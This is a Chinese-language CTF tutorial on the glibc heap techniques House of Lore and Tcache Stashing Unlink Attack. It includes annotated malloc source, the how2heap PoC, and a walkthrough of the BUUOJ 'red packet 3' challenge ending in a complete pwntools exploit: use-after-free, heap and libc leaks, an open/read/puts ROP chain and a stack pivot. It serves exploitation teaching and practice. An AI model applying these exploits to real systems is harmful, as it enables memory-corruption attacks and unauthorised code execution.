0x00 前言
=======

上一篇讲述了许多新型house系列方法利用下都要用到的gadget——setcontext。我们在做题过程中一定也会想要用unlink进行提权的前期处理，但是在2.29往上，对unlink的保护机制越来越多，越来越难利用。这时候就发现了一种更方便的unlink方式——Tcache Stashing Unlink Attack。从本来任意写一个指定值或可扩大到任意地址分配chunk进而做到任意地址读写。

0x01 介绍
=======

Tcache Stashing Unlink Attack是一种利用了Smallbi的相关分配机制进行的攻击。

0x02 前置知识讲解
===========

说到Smallbin相关分配的攻击，那就必须要从House of Lore来讲解一下。

House Of Lore
-------------

### 利用思想

house\_of\_lore是一种对于small\_bin机制的利用，通过其他手段如果可以把bin-&gt;bk替换为small\_bin头chunk的bk，再提前设置好头chunk的bk，指向伪造的fake\_chunk。这样再次申请内存时就可以申请到fake\_chunk，是故可以泄露任何地址、或是修改其内容。&lt;br /&gt;

### 原理

首先看下smallbin范围内堆块申请的流程：

（注释写的比较清楚

```c
/*
       If a small request, check regular bin.  Since these "smallbins"
       hold one size each, no searching within bins is necessary.
       (For a large request, we need to wait until unsorted chunks are
       processed to find best fit. But for small ones, fits are exact
       anyway, so we can check now, which is faster.)
     */

    if (in_smallbin_range(nb)) {
        // 获取 small bin 的索引
        idx = smallbin_index(nb);
        // 获取对应 small bin 中的 chunk 指针
        bin = bin_at(av, idx);
        // 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk
        // 如果 victim = bin ，那说明该 bin 为空。
        // 如果不相等，那么会有两种情况
        if ((victim = last(bin)) != bin) {
            // 第一种情况，small bin 还没有初始化。
            if (victim == 0) /* initialization check */
                // 执行初始化，将 fast bins 中的 chunk 进行合并
                malloc_consolidate(av);
            // 第二种情况，small bin 中存在空闲的 chunk
            else {
                // 获取 small bin 中倒数第二个 chunk 。
                bck = victim->bk;
                // 检查 bck->fd 是不是 victim，防止伪造
                if (__glibc_unlikely(bck->fd != victim)) {
                    errstr = "malloc(): smallbin double linked list corrupted";
                    goto errout;
                }
                // 设置 victim 对应的 inuse 位
                set_inuse_bit_at_offset(victim, nb);
                // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来
                bin->bk = bck;
                bck->fd = bin;
                // 如果不是 main_arena，设置对应的标志
                if (av != &main_arena) set_non_main_arena(victim);
                // 细致的检查
                check_malloced_chunk(av, victim, nb);
                // 将申请到的 chunk 转化为对应的 mem 状态
                void *p = chunk2mem(victim);
                // 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff
                alloc_perturb(p, bytes);
                return p;
            }
        }
    }

```

这样仔细来看，是有一个漏洞的，就是在smallbin中存在其他堆块的时候，我们通过审查源码可以发现如果能够将头chunk的bk修改并且指向fake\_chunk并通过偶检查，在取走头部chunk之后，fake\_chunk就成为了挂在bk链的首部。

### 利用条件

首先就是最重要的条件，就是能够申请一块或者得到一块smallbin大小的chunk。其次，就是在smallbin的bk指针处能够伪造一个fake\_chunk，这就要求我们必须可以控制smallbin的bk指针，并且可以提前布置好fakechunk并且指向smallchunk的头部。并且fake\_chunk能够通过fd的检测：\_\_glibc\_unlikely(bck-&gt;fd != victim)

### poc调试

从网上巴拉了how2heap House Of Lore的POC

```c
/*
Advanced exploitation of the House of Lore - Malloc Maleficarum.
This PoC take care also of the glibc hardening of smallbin corruption.
[ ... ]
else
    {
      bck = victim->bk;
    if (__glibc_unlikely (bck->fd != victim)){
                  errstr = "malloc(): smallbin double linked list corrupted";
                  goto errout;
                }
       set_inuse_bit_at_offset (victim, nb);
       bin->bk = bck;
       bck->fd = bin;
       [ ... ]
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

void jackpot(){ fprintf(stderr, "Nice jump d00d\n"); exit(0); }

int main(int argc, char * argv[]){

  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[3] = {0};

  fprintf(stderr, "\nWelcome to the House of Lore\n");
  fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
  fprintf(stderr, "This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\n\n");

  fprintf(stderr, "Allocating the victim chunk\n");
  intptr_t *victim = malloc(0x100);
  fprintf(stderr, "Allocated the first small chunk on the heap at %p\n", victim);

  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
  intptr_t *victim_chunk = victim-2;

  fprintf(stderr, "stack_buffer_1 at %p\n", (void*)stack_buffer_1);
  fprintf(stderr, "stack_buffer_2 at %p\n", (void*)stack_buffer_2);

  fprintf(stderr, "Create a fake chunk on the stack\n");
  fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
         "in second to the last malloc, which putting stack address on smallbin list\n");
  stack_buffer_1[0] = 0;
  stack_buffer_1[1] = 0;
  stack_buffer_1[2] = victim_chunk;

  fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
         "chunk on stack");
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;

  fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
         "the small one during the free()\n");
  void *p5 = malloc(1000);
  fprintf(stderr, "Allocated the large chunk on the heap at %p\n", p5);

  fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
  free((void*)victim);

  fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are nil\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
  fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBin\n", victim);

  void *p2 = malloc(1200);
  fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);

  fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updated\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  //------------VULNERABILITY-----------

  fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");

  victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack

  //------------------------------------

  fprintf(stderr, "Now allocating a chunk with size equal to the first one freed\n");
  fprintf(stderr, "This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");

  void *p3 = malloc(0x100);

  fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
  char *p4 = malloc(0x100);
  fprintf(stderr, "p4 = malloc(0x100)\n");

  fprintf(stderr, "\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
         stack_buffer_2[2]);

  fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
  memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary

  // sanity check
  assert((long)__builtin_return_address(0) == (long)jackpot);
}
```

首先是申请了一个fastbin范围内的vittim chunk

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-27ca3a373cce7a85dbe1e67da961933ce4eb5e48.png)

还在栈上整了一个fake chunk，然后是为了绕过程序的检测所以将stack\_buffer\_1 的 bk 指针指向 stack\_buffer\_2、stack\_buffer\_2 的 fd 指针指向 stack\_buffer\_1

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-8e1f25a24817e95b805f864bacc8ba68b8f08245.png)

之后我们再去malloc一个chunk用来防止上一个堆快free之后与top chunk合并，然后free掉victim之后会放入fastbin中

接下来再去 malloc 一个 large chunk，会触发 fastbin 的合并，然后放到 unsorted bin 中，这样我们的 victim chunk 就放到了 unsorted bin 中，然后最终被 unsorted bin 分配到 small bin 中。这样我们就得到了一个small bin，之后我们改smallbin中的victim chunk的bk为stack\_buffer\_1，这样的话我们malloc两次就可以得到0x7fff75206750。

#### 简单来说

其实，我觉得这样理解的话挺麻烦的，反正我一开始学的时候就绕晕了。可以用简单的话来总结这个利用。就是先伪造，在一个可以leak出地址的地方伪造一个fake chunk的chunk头；然后获得一个smallbin并且将其bk指针修改为fake chunk地址，再分配两个堆块就可以分配到fake chunk，利用这个漏洞可以实现任意地址申请堆块，进而转化为任意地址读写。

还有就是，有的触发unlink就是为了得到地址相同的fastbin，从而实现fastbin attack；有的是为了使得更改某地址上的值。前者可以粗犷地让fd和bk都指向被unlink的chunk，同时被unlink的chunk的fd和bk都指向回来；后者被unlink chunk的fd/bk处即&amp;x被改写为x-0x10又被改写为x-0x18。&lt;br /&gt;

0x03 Tcache Stashing Unlink Attack
==================================

利用条件
----

感觉利用条件一点点苛刻实际上是有了calloc函数之后什么都好说。

1、需要用户能够控制small bin chunk的bk指针

2、程序可以跳过tcache bin申请chunk（可以用calloc函数，这个是最难解决的也是最好解决的）

3、程序可以分配两种或两种以上的unsorted bin大小的堆块。

利用目的
----

1、向任意指定位置写入可控的值。

2、向任意地址分配一个chunk，即：任意地址读写。

利用原理
----

最关键的就是有一个calloc能够跨过tcachebin申请堆块，calloc会遍历fastbin、smallbin、largebin，如果在tcache bin里，对应的size的bin不为空，则会将这些bin的chunk采用头插法插入到tcache bin里。这就是Tcache Stashing Unlink Attack的核心。先来看一下glibc的源码（有关Tcache Stashing Unlink Attack利用的部分）：

版本：glibc-2.29

```c
/* 
     If a small request, check regular bin.  Since these "smallbins" 
     hold one size each, no searching within bins is necessary. 
     (For a large request, we need to wait until unsorted chunks are 
     processed to find best fit. But for small ones, fits are exact 
     anyway, so we can check now, which is faster.) 
   */  

  if (in_smallbin_range (nb))  
    {  
      idx = smallbin_index (nb);  
      bin = bin_at (av, idx);  

      if ((victim = last (bin)) != bin) //取该索引对应的small bin中最后一个chunk  
        {  
          bck = victim->bk;  //获取倒数第二个chunk  
      if (__glibc_unlikely (bck->fd != victim)) //检查双向链表完整性  
        malloc_printerr ("malloc(): smallbin double linked list corrupted");  
          set_inuse_bit_at_offset (victim, nb);  
          bin->bk = bck; //将victim从small bin的链表中卸下  
          bck->fd = bin;  

          if (av != &main_arena)  
        set_non_main_arena (victim);  
          check_malloced_chunk (av, victim, nb);  
#if USE_TCACHE  
      /* While we're here, if we see other chunks of the same size, 
         stash them in the tcache.  */  
      size_t tc_idx = csize2tidx (nb); //获取对应size的tcache索引  
      if (tcache && tc_idx < mp_.tcache_bins) //如果该索引在tcache bin范围  
        {  
          mchunkptr tc_victim;  

          /* While bin not empty and tcache not full, copy chunks over.  */  
          while (tcache->counts[tc_idx] < mp_.tcache_count  //当tcache bin不为空并且没满，并且small bin不为空，则依次取最后一个chunk插入到tcache bin里  
             && (tc_victim = last (bin)) != bin)  
        {  
          if (tc_victim != 0)  
            {  
              bck = tc_victim->bk;  
              set_inuse_bit_at_offset (tc_victim, nb);  
              if (av != &main_arena)  
            set_non_main_arena (tc_victim);  
              bin->bk = bck; //将当前chunk从small bin里卸下  
              bck->fd = bin;  
                      //放入tcache bin里  
              tcache_put (tc_victim, tc_idx);  
                }  
        }  
        }  
#endif  
          void *p = chunk2mem (victim);  
          alloc_perturb (p, bytes);  
          return p;  
        }  
    }  
```

我们发现House Of Lore中要绕过的检查，这里同样要绕过。`__glibc_unlikely(bck->fd != victim)`

对于这个检查的问题海爷是这么说的：从small bin中取出最后一个chunk的时候，对双向链表做了完整性的检查，然而，后面将剩余chunk放入tcache bin的时候，却没有这个检查。然后，bck-&gt;fd = bin;这句代码，可以将bck-&gt;fd处写一个main\_arena地址。如果我们可以控制bck，那么就能实现任意地址处写一个main\_arena的地址。同理，如果我们能够控制small bin的bck，并且保证vuln\_addr-&gt;fd = bck，那么就能分配到vuln\_addr处。&lt;br /&gt;

按照我的理解来说就是，在存在一条tcache bin（未满）和两个相同大小的smallbin存在的时候，通过calloc函数申请此大小的堆块触发将后一个smallbin中的堆块插入tcachebin链中。在获取到一个smallbin中的一个chunk后，如果tcache任由足够空闲位置，会将剩余的smallbin挂进tcache中，在这个过程中只对第一个bin进行了完整性检查，后面的堆块的检查缺失。当攻击者可以修改一个small bin的bk时，就可以实现在任意地址上写一个libc地址。构造得当的情况下也可以分配fake\_chunk到任意地址。

在glibc中有这样的关键代码：

可见在tcache\_put函数中并没有做任何的安全检查所以当Tcachebin这种由两个及以上的空位程序就会将smallbin中bk上的fake chunk链入tcachebin中。

```c
static __always_inline void tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache;

  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

篇幅问题具体调试过程已经在网上被人写烂了，我就大概写一下过程：

先是创建了一个数组stack\_var\[0x10\]，还有一个指针数组chunk\_list\[0x10\]，还有一个指针target。然后打印了数组，指针数组，指针的地址。然后再stack\_var\[3\]的地方放入stack\_var\[2\]的地址。之后创建8个0xa0大小的chunk，并且将他们的指针放入chunk\_list\[\]中，然后释放掉6个chunk到tcachebin中。接下来依序释放chunk\_lis\[1\]、chunk\_lis\[0\]、chunk\_lis\[2\]中malloc指针指向的chunk。然后连续创建三个chunk，大小分别为0xb0、0xa0、0xa0。然后将chunk\_lis\[2\]\[1\]位置中的内容修改成stack\_var的起始地址，接着调用calloc()函数申请一个size为0xa0大小的chunk。最后申请一个size为0xa0大小的chunk，并将其malloc指针赋给target变量，并打印target。&lt;br /&gt;

0x04 题目实践
=========

仍然是找到网上最经典的题目：\[BUUOJ-2020 新春红包题-3\]

逆向分析
----

我们的重点是看Tcache Stashing Unlink Attack的利用方式，那么我们就用几句简单的话来描述这个程序的漏洞：

```php
保护出了canary之外全部开启，有增查删改，在free中没有将指针置零说明存在Use After Free漏洞，所以这个uaf非常容易利用。在add功能的时候分配堆块的时候是calloc()函数，在其申请的过程中会将chunk内的内容清空，还有我们之前说过的不会从tcache bin中取出这样的话只要是把Tcache bin中填满就可以正常利用了。开启了沙箱。
```

然后程序还留了后门，只要满足条件就可以。

利用过程
----

### 获得unsorted bin

首先我们先填满0x100的tcache bin的堆块链表，然后获得0x410的unsorted bin chunk

```python
    for i in range(8):
        add(i,4,'a')
    for i in range(8,14):
        add(i,2,'b')
    for i in range(14):
        delete(i)
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-0bc4e009836d81261619231fe2be85f222b5e490.png)

### leak\_heap

因为我们得到了tcache bin链，这就很好也可以泄露出heap地址

```python
    show(1)
    heap_addr = uu64(ru('\x0a'))
    print('heap_addr='+hex(heap_addr))
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-22f7fabd3d43e06a6a86bf3ccb4e1ac1e52ecf86.png)

### leak\_libc

也有unsorted bin，那么也可以同理泄露出libc

```python
    show(7)
    libc = uu64(ru('\x0a')[-6:]) - 0x7fd1a23ddca0 + 0x7fd1a1ff2000
    print(hex(libc))
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-127dc50f5165cee40b8bdb88c4ef3ef89b15b34a.png)

### 构造orw链

```python
    pop_rdi = libc_base + 0x0000000000026542
    pop_rsi = libc_base + 0x0000000000026f9e
    pop_rdx = libc_base + 0x000000000012bda6
    leave_ret = libc_base + 0x0000000000058373
    opens = libc.sym['open']
    read = libc.sym['read']
    puts = libc.sym['puts']
    open_addr = libc_base + opens
    read_addr = libc_base + read
    puts_addr = libc_base + puts
    orw_addr = heap_addr + 0x1F80
    flag_addr = orw_addr + 0x78
    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(open_addr)
    orw += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30) + p64(read_addr)
    orw += p64(pop_rdi) + p64(flag_addr) + p64(puts_addr)
    orw += '/password.txt\x00'
```

### 重要的unlink

从0x410的unsorted bin里切割一个0x310的空间，剩下的0x100的unsorted bin

```python
add(0,3,'a')
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-85edfd8db1669e4923f239946d79ec9c22b58b22.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-094447879d0d005e85e63eac62ed8139068c5ad6.png)

malloc一大的堆，使得unsorted bin里的0x100的chunk放入small bin

```python
add(0,4,'b')
```

可以看到堆块进入了smallbin

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-8f3d69b664fafe061a4491a62f659b71095e7add.png)

挡住top chunk，不能小于0x100，不然会从得到的small bin里取

```python
add(1,4,'a')
```

我们使用同样的方法，来得到第二个0x100的unsorted bin

```python
delete(0)
add(1,3,'a')
add(1,4,'b')
```

现在small bin中有了两个堆块

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-f27d0685a615c8bdf4ac3c67381fcd1201fefb45.png)

利用uaf修改第一个small bin的bk指针指向我们想要控制的地方

```python
pl = 'a'*0x300
pl += p64(0) + p64(0x101)#保持好small bin的chunk头
pl += p64(heap_addr + 0x1F70)#fd保持链子的完整
pl += p64(heap_addr - 0x1010 + 0x800 - 0x10)#我们要控制的地方
edit(0,pl)
```

成功控制

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-182539fc4a905d79bc2ae319461db02e53e2040b.png)

所以说我们现在就可以申请到目标位置了，这就是Tcache Stashing Unlink Attack

```python
add(2,0xF0,orw)
```

然后我们就是栈迁移到这里执行orw

```python
    pl = 'a'*0x300
    pl += p64(0) + p64(0x101)
    pl += p64(heap_addr + 0x1F70)
    pl += p64(heap_addr - 0x1010 + 0x800 - 0x10)
    edit(0,pl)
    add(2,0xF0,orw)
    sla('Your input:','666')
    pl = 'a'*0x80
    pl += p64(orw_addr - 0x8)
    pl += p64(leave_ret)
    sla(pl)
```

这大概就是Tcache Stashing Unlink Attack的利用过程

exp
---

```python
#encoding = utf-8
import os
import sys
import time
from pwn import *
from LibcSearcher import * 

context.log_level = "debug"
context.os = 'linux'
context.arch = 'amd64'

binary = "1"
libcelf = "libc-2.29.so"
ip = ""
port = ""
local = 1
arm = 0
core = 64

og = [0x4342,0x3342]

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\x00'))
uu64    = lambda data               :u64(data.ljust(8,'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

if(local==1):
    if(arm==1):
        if(core==64):
            p = process(["qemu-arm", "-g", "1212", "-L", "/usr/arm-linux-gnueabi",binary])
        if(core==32):
            p = process(["qemu-aarch64", "-g", "1212", "-L", "/usr/aarch64-linux-gnu/", binary])
    else:
        p = process(binary)
else:
    p = remote(ip,port)

elf = ELF(binary)
libc = ELF(libcelf)

def choice(cho):
    sla('Your input: ',cho)

def add(idx,size,content):
    choice(1)
    sla('Please input the red packet idx: ',idx)
    sla('How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ',size)
    sla('Please input content: ',content)

def delete(idx):
    choice(2)
    sla('Please input the red packet idx: ',idx)

def show(idx):
    choice(4)
    sla('Please input the red packet idx: ',idx)

def edit(idx,content):
    choice(3)
    sla('Please input the red packet idx: ',idx)
    sla('Please input content: ',content) 

def pwn():
    for i in range(8):
        add(i,4,'a')
    for i in range(8,14):
        add(i,2,'b')
    for i in range(14):
        delete(i)
    show(1)
    heap_addr = uu64(ru('\x0a'))
    print('heap_addr='+hex(heap_addr))
    show(7)
    libc_base = uu64(ru('\x0a')[-6:]) - 0x7fd1a23ddca0 + 0x7fd1a1ff2000
    print(hex(libc_base))

    pop_rdi = libc_base + 0x0000000000026542
    pop_rsi = libc_base + 0x0000000000026f9e
    pop_rdx = libc_base + 0x000000000012bda6
    leave_ret = libc_base + 0x0000000000058373
    opens = libc.sym['open']
    read = libc.sym['read']
    puts = libc.sym['puts']
    open_addr = libc_base + opens
    read_addr = libc_base + read
    puts_addr = libc_base + puts
    orw_addr = heap_addr + 0x1F80
    flag_addr = orw_addr + 0x78
    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(open_addr)
    orw += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30) + p64(read_addr)
    orw += p64(pop_rdi) + p64(flag_addr) + p64(puts_addr)
    orw += './flag\x00'

    add(0,3,'a')
    add(0,4,'b')
    add(1,4,'a')

    delete(0)
    add(1,3,'a')
    add(1,4,'b')

    pl = 'a'*0x300
    pl += p64(0) + p64(0x101)
    pl += p64(heap_addr + 0x1F70)
    pl += p64(heap_addr - 0x1010 + 0x800 - 0x10)
    edit(0,pl)
    add(2,0xF0,orw)
    sla('Your input:','666')
    pl = 'a'*0x80
    pl += p64(orw_addr - 0x8)
    pl += p64(leave_ret)
    sla(pl)
    #gdb.attach(p)
    itr()

'''
i = 0
while 1:
    i += 1
    log.warn(str(i))
    try:  
        pwn()
    except Exception:
        p.close()
        if(local == 1):
            p = process(binary)
        else:
            p = remote(ip,port)
        continue
'''

if __name__ == '__main__':
    pwn()
```

0x05 后记
=======

有了高版本unlink的利用方法。以后做题也有个思路。

0x06 参考链接
=========

[Tcache Stashing Unlink Attack利用思路 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/198173)

[(9条消息) Tcache Stashing Unlink Attack\_ha1vk的博客-CSDN博客](https://blog.csdn.net/seaaseesa/article/details/105870247)

[(9条消息) 好好说话之Tcache Attack（3）：tcache stashing unlink attack\_hollk的博客-CSDN博客](https://blog.csdn.net/qq_41202237/article/details/113604261)

[(9条消息) House\_of\_Lore学习\_Echo1l的博客-CSDN博客](https://blog.csdn.net/Echoion/article/details/120499769)

[(9条消息) house of lore学习\_西子云齐的博客-CSDN博客](https://blog.csdn.net/xiziyunqi/article/details/81349657)